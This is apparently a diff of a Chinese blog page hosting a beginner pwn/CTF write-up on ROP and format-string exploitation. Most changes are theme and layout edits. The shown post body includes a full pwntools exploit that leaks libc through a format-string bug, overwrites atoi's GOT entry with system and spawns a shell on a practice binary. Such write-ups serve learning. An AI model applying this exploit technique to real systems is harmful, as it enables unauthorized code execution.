@@ -78,7 +78,7 @@
   
 </head>
 
-<body style="background-color: #f0f3f6;">
+<body>
   
 
 
@@ -90,15 +90,18 @@
 <header class="header">
 
 <div class="logo-wrap"><a class="title" href="/"><div class="main">shanah's blog</div></a></div>
-<nav class="menu dis-select"><a class="nav-item active" href="/">文章</a><a class="nav-item" href="/wiki/">项目</a><a class="nav-item" href="/about/">关于</a></nav></header>
+<nav class="menu dis-select"><a class="nav-item active" href="/">文章</a><a class="nav-item" href="/wiki/">项目</a></nav></header>
 
 <div class="widgets"><div class='widget-wrap' id='markdown'>
   <div class='widget-header cap dis-select'>
-    <span class='name'>欢迎</span>
+    <span class='name'>你好</span>
   </div>
   <div class='widget-body fs14'>
     
-      <p>欢迎光临小站，<a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/">Stellar</a> 是一个支持 wiki 的 hexo 主题，适合综合型站点使用。同时也拥有简约而精美的视觉设计和丰富的标签插件，帮助您简单从容地应对各种场合。</p>
+      <p>这里记录着我遇到的点点滴滴。</p>
+
+    
+      <p>‘bitter for sweeter’</p>
 
     
   </div>
@@ -112,15 +115,14 @@
     <div class='l_main'>
       
 
-      <div style="background-color: #fff;">
-   
-  
-  
+      
+
+
 <div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a><span class="sep"></span><a class="cap breadcrumb" href="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/">pwn实践记录--rop入门</a></div></div>
 
-  <article class='content md w'>
-  <h1 class="article-title"><span>pwn实践记录--rop入门</span></h1>
-  <p>pwn实践记录</p>
+<article class='content md w'>
+<h1 class="article-title"><span>pwn实践记录--rop入门</span></h1>
+<p>pwn实践记录</p>
 <span id="more"></span>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/1.jpg" alt="1.jpg"><br>回过来记录入门历程主要是为了复习巩固pwn的分析思路。因为写的很详细，篇幅很长，未写完的会第二天写。全部内容包括：ret2shellcode、ret2libc(绕过NX)、ret2libc(绕过ASLR)、格式化字符串漏洞。若理解有错误，请在评论区指正，阿里嘎多。</p>
 <p>本次回顾涉及到的elf文件以及exp都能在<a target="_blank" rel="noopener" href="https://github.com/TonyShanc/new2pwn">这里</a>获取到。<br>环境准备：linux(32位程序运行环境)、IDA Pro、gdb插件、python+pwntools、不屈意志:)<br>知识回顾：<a target="_blank" rel="noopener" href="https://blog.csdn.net/RChaos/article/details/104344276">操作系统预防二进制漏洞的保护机制</a>、elf文件组成、栈机制、大小端。</p>
@@ -164,22 +166,24 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;pwne&#x27;</span>)</span><br><span class="line"><span class="comment"># conn=remote(&#x27;ip&#x27;,port)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwne&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;[Y/N]\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;NAME:\n\n&#x27;</span>)</span><br><span class="line">p.sendline(p32(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + <span class="string">&#x27;%7$s&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;WELCOME \n&#x27;</span>)</span><br><span class="line">puts_addr=p.recv()[<span class="number">4</span>:<span class="number">8</span>]</span><br><span class="line"><span class="comment"># print u32(put_addr)</span></span><br><span class="line">system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>] - libc.symbols[<span class="string">&#x27;puts&#x27;</span>] + u32(puts_addr)</span><br><span class="line">atoi_got_addr = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">p.sendline(<span class="string">&#x27;17&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;[Y/N]\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;NAME:\n\n&#x27;</span>)</span><br><span class="line">p.sendline(fmtstr_payload(<span class="number">7</span>, &#123;atoi_got_addr: system_addr&#125;))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;GET YOUR AGE:\n\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <p>效果如下：<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/25.jpg" alt="figure"></p>
 <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
-  
+
 <div class="article-footer reveal fs14"></div>
 
-  </article>
-  
-
-
-  
-
-
-  
+</article>
 
 
 
- 
-</div>
+
+
+
+
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="sitemap"><div class="sitemap-group"><span class="fs14">社交</span><a href="/">友链</a><a href="/">留言板</a><a href="/">Spotify</a><a href="/">Unsplash</a></div><div class="sitemap-group"><span class="fs14">更多</span><a href="/">关于本站</a><a href="/">GitHub</a><a href="/">GitLab</a></div></div><div class="text"><p>All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</p>
+<p>This site was deployed by <a href="http://TonyShanc.github.io/">@shanah</a> using <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.2.1">Stellar</a>.</p>
+</div></footer>
 
       <div class='float-panel mobile-only blur' style='display:none'>
   <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
@@ -189,10 +193,151 @@
 
     </div>
   </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.2.1';
+  stellar.config = {
+    date_suffix: {
+      just: 'Just',
+      min: 'minutes ago',
+      hour: 'hours ago',
+      day: 'days ago',
+      month: 'months ago',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js',
+    sitesjs: '/js/plugins/sites.js',
+    friendsjs: '/js/plugins/friends.js',
+  };
+
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper/swiper-bundle.min.css","js":"https://unpkg.com/swiper/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+
+
+<!-- inject -->
+
+
+  </div>
 </body>
 <div class="footer" style="font-size: 13px;width: 100%; position: fixed; left: 0; bottom: 0; z-index: -1; font-family: Oswald, sans-serif;font: 14px/1 'Microsoft Yahei',PingFangSC,Microsoft Sans Serif,sans-serif;    font-variant-ligatures: normal;    font-variant-caps: normal;    font-variant-numeric: normal;    font-variant-east-asian: normal;    font-weight: normal;    font-stretch: normal;    font-size: 14px;-webkit-font-smoothing: antialiased;text-rendering: optimizeLegibility;">
   <div class="footer-wave" style="height: auto;">
-      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 520"><path fill="#3c4859" fill-opacity="1" d="M0,160L60,181.3C120,203,240,245,360,240C480,235,600,181,720,186.7C840,192,960,256,1080,261.3C1200,267,1320,213,1380,186.7L1440,160L1440,800L1380,800C1320,800,800,800,800,800C960,800,800,800,800,800C600,3800,800,800,800,800C240,800,800,800,800,800L0,800Z"></path></svg>
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 420"><path fill="#3c4859" fill-opacity="1" d="M0,160L60,181.3C120,203,240,245,360,240C480,235,600,181,720,186.7C840,192,960,256,1080,261.3C1200,267,1320,213,1380,186.7L1440,160L1440,800L1380,800C1320,800,800,800,800,800C960,800,800,800,800,800C600,3800,800,800,800,800C240,800,800,800,800,800L0,800Z"></path></svg>
   </div>
 </div>
 </html>
